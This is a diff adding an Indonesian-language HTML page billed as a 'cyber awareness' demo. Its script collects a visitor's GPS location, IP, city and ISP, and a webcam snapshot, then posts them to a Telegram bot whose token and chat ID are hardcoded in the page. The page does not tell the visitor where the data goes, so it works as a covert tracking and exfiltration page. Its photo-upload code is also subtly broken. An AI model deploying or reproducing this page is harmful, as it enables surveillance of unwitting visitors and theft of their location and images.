@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Awareness Logger</title>
+</head>
+<body>
+    <h1>Cyber Security Awareness</h1>
+    <p>Website ini menunjukkan betapa mudahnya informasi Anda dapat dikumpulkan.</p>
+    <button onclick="captureData()">Mulai</button>
+
+    <script>
+        const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; // Ganti dengan token bot Telegram
+        const CHAT_ID = "-1002270270494"; // Ganti dengan Chat ID Anda
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+        }
+
+        function captureData() {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    sendToTelegram(`📍 Lokasi: ${lat}, ${lon}`);
+
+                    fetch("https://ipinfo.io/json")
+                        .then(response => response.json())
+                        .then(data => {
+                            sendToTelegram(`🌐 IP: ${data.ip}\n🌍 Lokasi: ${data.city}, ${data.country}\n📡 ISP: ${data.org}`);
+                        });
+                },
+                error => {
+                    sendToTelegram("❌ Lokasi tidak diizinkan.");
+                }
+            );
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+
+                    let canvas = document.createElement("canvas");
+                    let ctx = canvas.getContext("2d");
+
+                    setTimeout(() => {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        let imageData = canvas.toDataURL("image/png");
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: new FormData().append("photo", imageData).append("chat_id", CHAT_ID)
+                        });
+
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 3000);
+                })
+                .catch(error => {
+                    sendToTelegram("❌ Kamera tidak diizinkan.");
+                });
+        }
+    </script>
+</body>
+</html>
